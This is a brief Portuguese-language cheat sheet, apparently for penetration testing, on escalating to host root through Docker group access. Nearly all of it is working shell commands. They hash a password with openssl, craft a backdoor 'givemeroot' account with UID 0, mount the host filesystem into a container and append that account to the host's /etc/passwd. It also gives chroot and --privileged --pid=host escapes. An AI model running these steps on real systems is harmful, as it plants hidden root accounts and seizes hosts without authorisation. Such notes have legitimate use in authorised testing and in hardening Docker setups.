Como containers são executados como root basta montar o diretório `/` na pasta `mnt` do container e modificar o arquivo `/etc/passwd`

Para gerar uma senha criptografada com md5crypt para inserir no arquivo passwd:
```sh
openssl passwd -1 -salt evil <passwd>
```
```sh
hpass=$(openssl passwd -1 -salt evil <passwd>)
echo -e "givemeroot:$hpass:0:0:root:/root:/bin/bash" > new_account
mv new_account /tmp/new_account
```
```sh
docker run --rm -tid -v /:/mnt/ alpine
docker exec -ti $(docker ps -a -q) sh
```
```sh
cat /mnt/tmp/new_account >> /mnt/etc/passwd
```
```sh
docker run --rm -it -v /:/mnt/ ubuntu chroot /mnt/ sh
# or
docker run --rm -it --pid=host --privileged ubuntu sh
```
